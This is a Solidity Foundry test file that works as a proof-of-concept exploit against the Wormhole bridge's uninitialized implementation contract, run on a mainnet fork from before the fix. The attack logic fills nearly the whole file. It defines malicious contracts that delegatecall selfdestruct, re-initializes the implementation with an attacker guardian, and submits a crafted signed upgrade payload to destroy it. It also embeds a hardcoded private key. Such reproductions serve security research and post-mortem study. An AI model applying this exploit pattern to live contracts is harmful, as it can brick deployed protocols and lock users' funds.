// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "./BytesLib.sol";

import {TestHarness} from "../../TestHarness.sol";

interface Structs {
	struct Signature {
		bytes32 r;
		bytes32 s;
		uint8 v;
		uint8 guardianIndex;
	}

	struct VM {
		uint8 version;
		uint32 timestamp;
		uint32 nonce;
		uint16 emitterChainId;
		bytes32 emitterAddress;
		uint64 sequence;
		uint8 consistencyLevel;
		bytes payload;

		uint32 guardianSetIndex;
		Signature[] signatures;

		bytes32 hash;
	}
}

interface IWormholeProxy { }

interface IWormholeImpl {
    function initialize(address[] memory initialGuardians, uint16 chainId, uint16 governanceChainId, bytes32 governanceContract) external;
    function governanceChainId() external view returns (uint16);
    function governanceContract() external view returns (bytes32);
    function getCurrentGuardianSetIndex() external view returns (uint32);
    function submitContractUpgrade(bytes memory _vm) external;
}

contract EvilWormhole {

  function initialize() external {
    Destructor des = new Destructor();
    (bool success, ) = address(des).delegatecall(abi.encodeWithSignature("destruct()"));
    require(success);
  }
}

contract Destructor {

  function destruct() external {
    console.log("Self-destructing...");
    console.log(address(this));
    selfdestruct(payable(address(this)));
  }
}

contract ExploitWormhole is TestHarness {  

    bytes32 internal constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    IWormholeImpl internal wormholeimpl = IWormholeImpl(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d);
    //IWormholeProxy internal wormholeproxy = IWormholeProxy(0x98f3c9e6E3fAce36bAAd05FE09d375Ef1464288B);
    address internal attacker = address(0xa0b64f8d5C20F1828fEe62ef293f9fCc683e67d6);
    address[] attacker_addresses = [attacker];
    EvilWormhole evilWormhole;

    function setUp() external {
        // Wormhome last upgraded their implementation contract submitContractUpgrade() at tx hash: https://etherscan.io/tx/0xd45111d7c22a4ba4a1cd110c8224859000fcb0cd5cefd02bd40434ac42a07be6
        // at blockNumber: 13818843
        // Wormhole initialized the implementation initialize(), fixing the issue, at tx hash: https://etherscan.io/tx/0x9acb2b580aba4f5be75366255800df5f62ede576619cb5ce638cedc61273a50f
        // at blockNumber: 14269474

        cheat.createSelectFork("mainnet", 13818843);
    }

    function signAndEncodeVM(/*uint32 timestamp, uint32 nonce, uint16 emitterChainId, bytes32 emitterAddress, uint64 sequence, uint8 consistencyLevel*/) internal returns (bytes memory) {
      uint256 privateKey = 0x16cc57a7be74120502976f62694d6917d5a7ab1069c7d8e51abfad22d2446f4b;
      bytes memory hash = hex'2cbb8dc35cf56e1290f53431a4effde8d5a1b3ad81556ad796f165fad9a6f485'; // to be replaced with actual body of input variables
      bytes memory vm = hex'0100000000010038322b62e2690319cc2323565aa999d14a05a72f6500a014f3ad7728f77b146c7c6859db43fb993ddfbefb4d5302d5bf2a8aad6999340511a6a57196e8fdd6230100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000436f72650100000000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f';

      //(uint8 v, bytes32 r, bytes32 s) = cheat.sign(privateKey, hash);

      return vm;
    }

    // Adapted version of https://etherscan.io/address/0x736d2a394f7810c17b3c6fed017d5bc7d60c077d#code#F5#L95
    function parseVM(bytes memory encodedVM) public pure virtual returns (Structs.VM memory vm) {
        uint index = 0;

        vm.version = BytesLib.toUint8(encodedVM, index);
        index += 1;
        require(vm.version == 1, "VM version incompatible");

        vm.guardianSetIndex = BytesLib.toUint32(encodedVM, index);
        index += 4;

        // Parse Signatures
        uint256 signersLen = BytesLib.toUint8(encodedVM, index);
        index += 1;
        vm.signatures = new Structs.Signature[](signersLen);
        for (uint i = 0; i < signersLen; i++) {
            vm.signatures[i].guardianIndex = BytesLib.toUint8(encodedVM, index);
            index += 1;

            vm.signatures[i].r = BytesLib.toBytes32(encodedVM, index);
            index += 32;
            vm.signatures[i].s = BytesLib.toBytes32(encodedVM, index);
            index += 32;
            vm.signatures[i].v = BytesLib.toUint8(encodedVM, index) + 27;
            index += 1;
        }

        // Hash the body
        bytes memory body = BytesLib.slice(encodedVM, index, encodedVM.length - index);
        vm.hash = keccak256(abi.encodePacked(keccak256(body)));

        // Parse the body
        vm.timestamp = BytesLib.toUint32(encodedVM, index);
        index += 4;

        vm.nonce = BytesLib.toUint32(encodedVM, index);
        index += 4;

        vm.emitterChainId = BytesLib.toUint16(encodedVM, index);
        index += 2;

        vm.emitterAddress = BytesLib.toBytes32(encodedVM, index);
        index += 32;

        vm.sequence = BytesLib.toUint64(encodedVM, index);
        index += 8;

        vm.consistencyLevel = BytesLib.toUint8(encodedVM, index);
        index += 1;

        vm.payload = BytesLib.slice(encodedVM, index, encodedVM.length - index);
    }

    function dumpCode(address addr) internal {
        bytes memory bytecode = BytesLib.slice(addr.code, 0, 32);
        
        console.log("Wormhole Bridge implementation @ ", addr);
        console.log("Bytecode sequence:");
        console.logBytes(bytecode);
        console.log("");
    }

    function test_attack() external {
        evilWormhole = new EvilWormhole(); // @ 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
        bytes memory _vm;
        Structs.VM memory vm;
        bytes32 HASH_ZERO = 0x0000000000000000000000000000000000000000000000000000000000000000;
              
        dumpCode(address(wormholeimpl));

        console.log("Evil address");
        console.log(address(evilWormhole));
        console.log("ExploitWormhole address");
        console.log(address(this));

        console.log("Attacker re-initializes bridge with their evil contract...");
        wormholeimpl.initialize(attacker_addresses, 0, 0, HASH_ZERO);
        _vm = signAndEncodeVM();
        vm = parseVM(_vm);

        console.log("Malicious VM prepared with payload:");
        console.logBytes(vm.payload);

        wormholeimpl.submitContractUpgrade(_vm);
    }

    function test_validate_attack() external {
      console.log("Validating attack...");
        dumpCode(address(wormholeimpl));
    }
}
